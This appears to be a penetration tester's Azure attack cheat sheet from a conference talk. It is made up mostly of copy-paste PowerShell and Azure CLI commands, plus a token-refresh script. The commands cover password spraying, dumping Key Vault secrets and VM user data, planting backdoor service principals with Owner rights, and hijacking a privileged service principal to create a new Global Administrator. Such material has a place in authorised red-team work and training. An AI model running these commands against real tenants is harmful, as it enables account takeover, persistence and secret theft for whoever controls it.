# üõ°Ô∏è Azure Pentest CheatSheet

This is the cheat sheet of my Azure cloud attack process presented during my talk. Curated for labs, CTFs, or real-world engagements. Inspired by public tools, labs, and attack chains used in modern assessments.

---

## üß™ 1. Lab Setup ‚Äì Simulated Azure Environments
Be careful on Prod environement!

| Name | Description |
|------|-------------|
| [**PurpleCloud**](https://github.com/iknowjason/PurpleCloud) | Terraform-based Azure lab deployment with detection opportunities. |
| [**AzureGoat**](https://github.com/ine-labs/AzureGoat) | Vulnerable-by-design Azure application to explore misconfigurations. |
| [**Sentinel Playground**](https://github.com/SecureHats/Sentinel-playground) | Simulates alerts/detections for Microsoft Sentinel. |
| [**BadZure**](https://github.com/mvelazc0/BadZure) | Multiple Azure attack scenarios with misconfigurations. |

---

## üß∞ 2. Tools for Azure Red Teaming
Be careful on Prod environement!

| Tool | Purpose |
|------|---------|
| AADInternals | Tenant recon and attack simulation |
| o365creeper | Validate user emails in Azure/O365 |
| MicroBurst | Scripts for Azure enumeration |
| MSOLSpray | Password spraying |
| Evilginx3 | Phishing for cookies |
| ROADtools | Visualize and analyze Entra ID |
| Stormspotter | Map Azure relationships |
| AzureHound | BloodHound support for Azure |
| Az PowerShell | Enumeration and scripting |
| Az CLI | Command-line Azure interactions |

---

## üìú 3. my Copy-Paste snippets

### Authentication

```powershell
Connect-AzAccount
Connect-MgGraph
az login
```
### Az PowerShell Module

```powershell
Import-Module Az
```

#### Authentication

```powershell
Connect-AzAccount

## Or this way sometimes gets around MFA restrictions

$credential = Get-Credential
Connect-AzAccount -Credential $credential
```
### Federation Info

```powershell
Invoke-WebRequest -Uri "https://login.microsoftonline.com/getuserrealm.srf?login=user@domain.com&xml=1"
```

### Tenant ID Lookup

```powershell
Invoke-RestMethod -Uri "https://login.microsoftonline.com/domain.com/v2.0/.well-known/openid-configuration"
```

### Get Context

```powershell
Get-AzContext
Get-AzSubscription
```

### Subscription and Resource Group Info

```powershell
Select-AzSubscription -SubscriptionId "<sub-id>"
Get-AzResource
Get-AzResourceGroup
```

### Users and Groups Enumeration

```powershell
Get-MgUser -All
Get-MgGroup -All
Get-AzADUser
Get-AzADGroup
```

### Directory Roles

```powershell
Get-MgDirectoryRole
Get-MgDirectoryRoleMember -DirectoryRoleId (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
```

### Password Spray

```powershell
Invoke-MSOLSpray -UserList users.txt -Password Winter2025!
```

### Key Vault Access

```powershell
az keyvault list
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>
```

### Virtual Machines

```powershell
Get-AzVM
az vm list -o table
```

### App Services

```powershell
Get-AzWebApp
az webapp list -o table
```

### Function Apps

```powershell
Get-AzFunctionApp
az functionapp list -o table
```

### Storage Accounts

```powershell
Get-AzStorageAccount
az storage account list -o table
```

### Runbooks

```powershell
Get-AzAutomationAccount
Get-AzAutomationRunbook -AutomationAccountName <account> -ResourceGroupName <group>
```

### Service Principals

```powershell
New-AzADServicePrincipal -DisplayName "BackdoorSP" -Role Owner
```

### Graph Enumeration

```powershell
az ad user list
az ad group list
```

### Export Context

```powershell
Save-AzContext -Path ./AzureContext.json
Import-AzContext -Path ./AzureContext.json
```

### Add Role to SP

```powershell
az role assignment create --assignee <sp-id> --role "Owner" --scope /subscriptions/<sub-id>
```

### Invite External User

```powershell
az rest --method POST --uri https://graph.microsoft.com/v1.0/invitations --body "{'invitedUserEmailAddress':'test@example.com','inviteRedirectUrl':'https://portal.azure.com'}"
```

### Custom RBAC Role

```powershell
New-AzRoleDefinition -InputFile "customrole.json"
```

### Logging & Monitoring

```powershell
Get-AzLog
Get-AzActivityLog
```

### VM Command Execution

```powershell
Invoke-AzVMRunCommand -ResourceGroupName <group> -VMName <vm> -CommandId 'RunPowerShellScript' -ScriptPath ./script.ps1
```

### SQL Enumeration

```powershell
Get-AzSqlServer
Get-AzSqlDatabase -ServerName <server> -ResourceGroupName <group>
```

### Public IPs

```powershell
Get-AzPublicIpAddress
```

### Backdoor via Role Assignment

```powershell
az ad sp create-for-rbac --name attacker --role Contributor
```

#### Account Information

List the current Azure contexts available

```powershell
Get-AzContext -ListAvailable
```

Get context details

```powershell
$context = Get-AzContext
$context.Name
$context.Account
```

List subscriptions

```powershell
Get-AzSubscription
```

Choose a subscription

```powershell
Select-AzSubscription -SubscriptionID "SubscriptionID"
```

Get the current user's role assignment

```powershell
Get-AzRoleAssignment
```

List all resources and resource groups

```powershell
Get-AzResource
Get-AzResourceGroup
```

List storage accounts

```powershell
Get-AzStorageAccount

#### Virtual Machines

List VMs and get OS details

```powershell
Get-AzVM
$vm = Get-AzVM -Name "VM Name" 
$vm.OSProfile
```

Extract VM UserData
```powershell
$subs = Get-AzSubscription

$fulllist = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $vms = Get-AzVM
    $list = $vms.UserData
    $list
    $fulllist += $list
}
$fulllist
```

Run commands on VMs

```powershell
Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

#### Networking

List virtual networks

```powershell
Get-AzVirtualNetwork
```

List public IP addresses assigned to virtual NICs

```powershell
Get-AzPublicIpAddress
```

Get Azure ExpressRoute (VPN) Info

```powershell
Get-AzExpressRouteCircuit
```

Get Azure VPN Info

```powershell
Get-AzVpnConnection
```
#### Invite a Guest User to Tenant via AZ CLI

```powershell
$Body="{'invitedUserEmailAddress':'Email Address to Invite', 'inviteRedirectUrl': 'https://portal.azure.com'}‚Äù
az rest --method POST --uri https://graph.microsoft.com/v1.0/invitations --headers "Content-Type=application/json" --body $Body
```
Then use InvitationRedeemUrl to accept invite on guest user account

#### Service Principal Attack Path
Commands for resetting a service principal credential that has higher privileges and then using the service principal to create a new user in the tenant with global admin permissions.

Create a new credential for service principal

```bash
az ad sp credential reset --id <app_id>
az ad sp credential list --id <app_id>
```

Login as a service principal using the password and app ID from previous command

```bash
az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions
```

Create a new user in the tenant

```bash
az ad user create --display-name <display name> --password <password> --user-principal-name <full upn>
```

Add user to Global Admin group ID via MS Graph API:

```powershell
$Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}‚Äù
az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
```
### Other Azure & O365 Tools

#### MicroBurst

Azure security assessment tool

https://github.com/NetSPI/MicroBurst 

Look for open storage blobs 

```powershell
Invoke-EnumerateAzureBlobs -Base $BaseName 
```

Export SSL/TLS certs 

```powershell
Get-AzPasswords -ExportCerts Y
```

Azure Container Registry dump

```powershell
Get-AzPasswords
Get-AzACR
```

Get-Tokens Script

```powershell
Function Get-Tokens
{
<#
    .SYNOPSIS
        Request new ID,Access,Refresh token using the existing Refresh token and the Client ID, Client Secrets

    .PARAMETER client_id
        Pass the application id that is generated once we register the application.

    .PARAMETER scope
        Define the Scope for the tokens.

    .PARAMETER refresh_token
        Pass the exisiting refresh token.

    .PARAMETER redirect_uri
        Pass the redirect uri entered while registering the application.

    .PARAMETER client_secret
        Pass the client secret entered while registering the application.

    .EXAMPLE
        PS C:\> Get-Tokens -client_id "543f176a-c39t-4699-8a51-fr359fd3d543" -scope "https://graph.microsoft.com/.default openid offline_access" -refresh_token "0.AXEAUOUDWlHFvAU-Lh1qyqKr8rd2XT4SbwZlGikfe35yj1zBxABo" -redirect_uri "https://localhost/" -client_secret "jd_jf345j¬®ner373_fcue$de"

    .EXAMPLE
        PS C:\> Get-Tokens -client_id "543f176a-c39t-4699-8a51-fr359fd3d543" -scope "https://graph.microsoft.com/.default openid offline_access" -refresh_token "0.AXEAUOUDWlHFvAU-Lh1qyqKr8rd2XT4SbwZlGikfe35yj1zBxABo" -client_secret "jd_jf345j¬®ner373_fcue$de"

    .LINK
        https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow#refresh-the-access-token
#>

    [CmdletBinding()]
    param(
    [Parameter(Mandatory=$True)]
    [String]
    $client_id = $null,
    [Parameter(Mandatory=$True)]
    [String]
    $scope = $null,
    [Parameter(Mandatory=$True)]
    [String]
    $refresh_token = $null,
    [Parameter(Mandatory=$false)]
    [String]
    $redirect_uri = $null,
    [Parameter(Mandatory=$True)]
    [String]
    $client_secret = $null
    )

    $psobj = New-Object PSObject

    $Params = @{
    "URI"     = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    "Method"  = "POST"
    "Headers" = @{
        "Content-Type"  = "application/x-www-form-urlencoded"
        }
    }

    $Body = @{client_id=$client_id;
    scope=$scope;
    refresh_token=$refresh_token;
    redirect_uri=$redirect_uri;
    grant_type="refresh_token";
    client_secret=$client_secret;
    }

    $Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body

    Add-Member -InputObject $psobj -NotePropertyName "token_type" -NotePropertyValue $Result.token_type
    Add-Member -InputObject $psobj -NotePropertyName "scope" -NotePropertyValue $Result.scope
    Add-Member -InputObject $psobj -NotePropertyName "access_token" -NotePropertyValue $Result.access_token
    Add-Member -InputObject $psobj -NotePropertyName "refresh_token" -NotePropertyValue $Result.refresh_token
    Add-Member -InputObject $psobj -NotePropertyName "id_token" -NotePropertyValue $Result.id_token
    Write-Output $psobj
}
```
#### PowerZure

Azure security assessment tool

https://github.com/hausec/PowerZure

#### ROADTools

Framework to interact with Azure AD

https://github.com/dirkjanm/ROADtools

#### Stormspotter

Red team tool for graphing Azure and Azure AD objects

https://github.com/Azure/Stormspotter

#### MSOLSpray

Tool to password spray Azure/O365

https://github.com/dafthack

```powershell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020
```
#### AzureHound

Tool to identify attack paths in Azure AD and AzureRM

https://github.com/BloodHoundAD/AzureHound

Run AzureHound with a refresh token:
For installation follow this procedure :  [Bloodhound installation](https://bloodhound.readthedocs.io/en/latest/installation/linux.html)
```bash
./azurehound -r "0.ARwA6Wg..." list --tenant "tenant ID" -v 2 -o output.json
```
